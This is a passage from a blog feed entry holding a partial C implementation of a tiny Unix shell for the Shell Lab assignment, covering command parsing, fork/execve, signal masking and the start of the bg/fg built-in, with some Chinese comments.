#define MAXARGS 128    /* max args on a command line */&#13;
#define MAXJOBS 16     /* max jobs at any point in time */&#13;
#define MAXJID 1 &lt;&lt; 16 /* max job ID */&#13;
&#13;
/* Job states */&#13;
#define UNDEF 0 /* undefined */&#13;
#define FG 1    /* running in foreground */&#13;
#define BG 2    /* running in background */&#13;
#define ST 3    /* stopped */&#13;
&#13;
/*&#13;
 * Jobs states: FG (foreground), BG (background), ST (stopped)&#13;
 * Job state transitions and enabling actions:&#13;
 *     FG -&gt; ST  : ctrl-z&#13;
 *     ST -&gt; FG  : fg command&#13;
 *     ST -&gt; BG  : bg command&#13;
 *     BG -&gt; FG  : fg command&#13;
 * At most 1 job can be in the FG state.&#13;
 */&#13;
&#13;
/* Global variables */&#13;
extern char **environ;   /* defined in libc */&#13;
char prompt[] = 'tsh&gt; '; /* command line prompt (DO NOT CHANGE) */&#13;
int verbose = 0;         /* if true, print additional output */&#13;
int nextjid = 1;         /* next job ID to allocate */&#13;
char sbuf[MAXLINE];      /* for composing sprintf messages */&#13;
&#13;
struct job_t&#13;
{                          /* The job struct */&#13;
    pid_t pid;             /* job PID */&#13;
    int jid;               /* job ID [1, 2, ...] */&#13;
    int state;             /* UNDEF, BG, FG, or ST */&#13;
    char cmdline[MAXLINE]; /* command line */&#13;
};&#13;
struct job_t jobs[MAXJOBS]; /* The job list */&#13;
/* End global variables */&#13;
&#13;
/* Function prototypes */&#13;
&#13;
/* Here are the functions that you will implement */&#13;
void eval(char *cmdline);&#13;
int builtin_cmd(char **argv);&#13;
void do_bgfg(char **argv);&#13;
void waitfg(pid_t pid);&#13;
&#13;
void sigchld_handler(int sig);&#13;
void sigtstp_handler(int sig);&#13;
void sigint_handler(int sig);&#13;
&#13;
/* Here are helper routines that we've provided for you */&#13;
int parseline(const char *cmdline, char **argv);&#13;
void sigquit_handler(int sig);&#13;
&#13;
void clearjob(struct job_t *job);&#13;
void initjobs(struct job_t *jobs);&#13;
int maxjid(struct job_t *jobs);&#13;
int addjob(struct job_t *jobs, pid_t pid, int state, char *cmdline);&#13;
int deletejob(struct job_t *jobs, pid_t pid);&#13;
pid_t fgpid(struct job_t *jobs);&#13;
struct job_t *getjobpid(struct job_t *jobs, pid_t pid);&#13;
struct job_t *getjobjid(struct job_t *jobs, int jid);&#13;
int pid2jid(pid_t pid);&#13;
void listjobs(struct job_t *jobs);&#13;
&#13;
void usage(void);&#13;
void unix_error(char *msg);&#13;
void app_error(char *msg);&#13;
typedef void handler_t(int);&#13;
handler_t *Signal(int signum, handler_t *handler);&#13;
&#13;
/*&#13;
 * main - The shell's main routine&#13;
 */&#13;
int main(int argc, char **argv)&#13;
{&#13;
    char c;&#13;
    char cmdline[MAXLINE];&#13;
    int emit_prompt = 1; /* emit prompt (default) */&#13;
&#13;
    /* Redirect stderr to stdout (so that driver will get all output&#13;
     * on the pipe connected to stdout) */&#13;
    dup2(1, 2);&#13;
&#13;
    /* Parse the command line */&#13;
    while ((c = getopt(argc, argv, 'hvp')) != EOF)&#13;
    {&#13;
        switch (c)&#13;
        {&#13;
        case 'h': /* print help message */&#13;
            usage();&#13;
            break;&#13;
        case 'v': /* emit additional diagnostic info */&#13;
            verbose = 1;&#13;
            break;&#13;
        case 'p':            /* don't print a prompt */&#13;
            emit_prompt = 0; /* handy for automatic testing */&#13;
            break;&#13;
        default:&#13;
            usage();&#13;
        }&#13;
    }&#13;
&#13;
    /* Install the signal handlers */&#13;
&#13;
    /* These are the ones you will need to implement */&#13;
    Signal(SIGINT, sigint_handler);   /* ctrl-c */&#13;
    Signal(SIGTSTP, sigtstp_handler); /* ctrl-z */&#13;
    Signal(SIGCHLD, sigchld_handler); /* Terminated or stopped child */&#13;
&#13;
    /* This one provides a clean way to kill the shell */&#13;
    Signal(SIGQUIT, sigquit_handler);&#13;
&#13;
    /* Initialize the job list */&#13;
    initjobs(jobs);&#13;
&#13;
    /* Execute the shell's read/eval loop */&#13;
    while (1)&#13;
    {&#13;
&#13;
        /* Read command line */&#13;
        if (emit_prompt)&#13;
        {&#13;
            printf('%s', prompt);&#13;
            fflush(stdout);&#13;
        }&#13;
        if ((fgets(cmdline, MAXLINE, stdin) == NULL) &amp;&amp; ferror(stdin))&#13;
            app_error('fgets error');&#13;
        if (feof(stdin))&#13;
        { /* End of file (ctrl-d) */&#13;
            fflush(stdout);&#13;
            exit(0);&#13;
        }&#13;
&#13;
        /* Evaluate the command line */&#13;
        eval(cmdline);&#13;
        fflush(stdout);&#13;
        fflush(stdout);&#13;
    }&#13;
&#13;
    exit(0); /* control never reaches here */&#13;
}&#13;
&#13;
/*&#13;
 * eval - Evaluate the command line that the user has just typed in&#13;
 *&#13;
 * If the user has requested a built-in command (quit, jobs, bg or fg)&#13;
 * then execute it immediately. Otherwise, fork a child process and&#13;
 * run the job in the context of the child. If the job is running in&#13;
 * the foreground, wait for it to terminate and then return.  Note:&#13;
 * each child process must have a unique process group ID so that our&#13;
 * background children don't receive SIGINT (SIGTSTP) from the kernel&#13;
 * when we type ctrl-c (ctrl-z) at the keyboard.&#13;
 */&#13;
void eval(char *cmdline)&#13;
{&#13;
    char *argv[MAXARGS]; /* argv for execve() */&#13;
    int bg;              /* should the job run in bg or fg? */&#13;
    pid_t pid;           /* process id */&#13;
    sigset_t mask_one, mask_all, prev;&#13;
&#13;
    // 设置阻塞信号&#13;
    sigfillset(&amp;mask_all); // Set all signal bits&#13;
&#13;
    sigemptyset(&amp;mask_one);        // Clear all signal bits&#13;
    sigaddset(&amp;mask_one, SIGCHLD); // Add SIGCHLD signal&#13;
&#13;
    bg = parseline(cmdline, argv); // Parse command line, formart result into argv&#13;
&#13;
    if (argv[0] == NULL)&#13;
    {&#13;
        return; // Ignore empty links&#13;
    }&#13;
&#13;
    if (!builtin_cmd(argv)) // NOT builtin_cmd&#13;
    {&#13;
        /**&#13;
         * Block SIGCHLD, avoid race&#13;
         * Ensure addjob executed before dealing the sigchld&#13;
         *&#13;
         */&#13;
        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev);&#13;
        if ((pid = fork()) == 0)&#13;
        {                                          /* child process */&#13;
            sigprocmask(SIG_SETMASK, &amp;prev, NULL); // Unblock sigchld of children process&#13;
            setpgid(0, 0);                         // Set unique process group ID&#13;
&#13;
            /* Background jobs should ignore SIGINT (ctrl-c)&#13;
             * and SIGTSTP (ctrl-z) */&#13;
            if (bg)&#13;
            {&#13;
                Signal(SIGINT, SIG_IGN);&#13;
                Signal(SIGTSTP, SIG_IGN);&#13;
            }&#13;
            char *path = argv[0];&#13;
            if (execve(path, argv, environ) &lt; 0)&#13;
            {&#13;
                sigprocmask(SIG_BLOCK, &amp;mask_all, NULL);&#13;
                printf('%s: Command not found.\n', path);&#13;
                sigprocmask(SIG_SETMASK, &amp;prev, NULL);&#13;
                fflush(stdout);&#13;
            }&#13;
            exit(0);&#13;
        }&#13;
        // Setting all signal bits is blocked, guarantee addjob executed&#13;
        sigprocmask(SIG_BLOCK, &amp;mask_all, NULL);&#13;
        addjob(jobs, pid, (bg == 1 ? BG : FG), cmdline);&#13;
        sigprocmask(SIG_SETMASK, &amp;mask_one, NULL);&#13;
        if (bg == 1)&#13;
        {&#13;
            printf('[%d] (%d) %s', pid2jid(pid), pid, cmdline);&#13;
        }&#13;
        else&#13;
        {&#13;
            waitfg(pid);&#13;
        }&#13;
        sigprocmask(SIG_SETMASK, &amp;prev, NULL); // Unmask all bits&#13;
    }&#13;
    return;&#13;
}&#13;
&#13;
/*&#13;
 * parseline - Parse the command line and build the argv array.&#13;
 *&#13;
 * Characters enclosed in single quotes are treated as a single&#13;
 * argument.  Return true if the user has requested a BG job, false if&#13;
 * the user has requested a FG job.&#13;
 */&#13;
int parseline(const char *cmdline, char **argv)&#13;
{&#13;
    static char array[MAXLINE]; /* holds local copy of command line */&#13;
    char *buf = array;          /* ptr that traverses command line */&#13;
    char *delim;                /* points to first space delimiter */&#13;
    int argc;                   /* number of args */&#13;
    int bg;                     /* background job? */&#13;
&#13;
    strcpy(buf, cmdline);&#13;
    buf[strlen(buf) - 1] = ' ';   /* replace trailing '\n' with space */&#13;
    while (*buf &amp;&amp; (*buf == ' ')) /* ignore leading spaces */&#13;
        buf++;&#13;
&#13;
    /* Build the argv list */&#13;
    argc = 0;&#13;
    if (*buf == '\'')&#13;
    {&#13;
        buf++;&#13;
        delim = strchr(buf, '\'');&#13;
    }&#13;
    else&#13;
    {&#13;
        delim = strchr(buf, ' ');&#13;
    }&#13;
&#13;
    while (delim)&#13;
    {&#13;
        argv[argc++] = buf;&#13;
        *delim = '\0';&#13;
        buf = delim + 1;&#13;
        while (*buf &amp;&amp; (*buf == ' ')) /* ignore spaces */&#13;
            buf++;&#13;
&#13;
        if (*buf == '\'')&#13;
        {&#13;
            buf++;&#13;
            delim = strchr(buf, '\'');&#13;
        }&#13;
        else&#13;
        {&#13;
            delim = strchr(buf, ' ');&#13;
        }&#13;
    }&#13;
    argv[argc] = NULL;&#13;
&#13;
    if (argc == 0) /* ignore blank line */&#13;
        return 1;&#13;
&#13;
    /* should the job run in the background? */&#13;
    if ((bg = (*argv[argc - 1] == '&amp;')) != 0)&#13;
    {&#13;
        argv[--argc] = NULL;&#13;
    }&#13;
    return bg;&#13;
}&#13;
&#13;
/*&#13;
 * builtin_cmd - If the user has typed a built-in command then execute&#13;
 *    it immediately.&#13;
 */&#13;
int builtin_cmd(char **argv)&#13;
{&#13;
    char *cmd = argv[0];&#13;
    if (strcmp(cmd, 'quit') == 0)&#13;
        exit(0); /* terminate shell */&#13;
    else if (strcmp(cmd, 'jobs') == 0)&#13;
    {&#13;
        listjobs(jobs);&#13;
        return 1;&#13;
    }&#13;
    else if (strcmp(cmd, 'bg') == 0 || strcmp(cmd, 'fg') == 0)&#13;
    {&#13;
        do_bgfg(argv);&#13;
        return 1;&#13;
    }&#13;
    else if (strcmp(argv[0], '&amp;') == 0)&#13;
    {&#13;
        return 1;&#13;
    }&#13;
    return 0; /* not a builtin command */&#13;
}&#13;
&#13;
/*&#13;
 * do_bgfg - Execute the builtin bg and fg commands&#13;
 */&#13;
void do_bgfg(char **argv)&#13;
{&#13;
    char *cmd = argv[0];&#13;
    if (argv[1] == NULL)&#13;
    {&#13;
        printf('%s command requires PID or %%jobid argument\n', cmd);&#13;
        return;&#13;
    }&#13;
    int id;&#13;
    struct job_t *ptr;&#13;
    if (argv[1][0] == '%')&#13;
    {&#13;
        if ((id = atoi(argv[1] + 1)) == 0)&#13;
        {&#13;
            printf('%s: argument must be a PID or %%jobid\n', cmd);&#13;
            return;&#13;
        }&#13;
        if ((ptr = getjobjid(jobs, id)) == NULL)&#13;
        {&#13;
            printf('%%%d: No such job\n', id);&#13;
            return;&#13;
        }&#13;
    }&#13;
    else&#13;
    {&#13;
&#13;
        if ((id = atoi(argv[1])) == 0)&#13;
        {&#13;
            printf('%s: argument must be a PID or %%jobid\n', cmd);&#13;
            return;&#13;
        }&#13;
        if ((ptr = getjobpid(jobs, id)) == NULL)&#13;
        {&#13;
            printf('(%d) : No such process\n', id);&#13;
            return;&#13;
        }&#13;
    }&#13;
    // 如果 pid &lt; -1，则信号 sig 将发送给进程组 ID 等于 pid 的所有进程。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/Shell%20Lab.html</guid><pubDate>Wed, 17 Jul 2024 07:17:38 +0000</pubDate></item></channel></rss>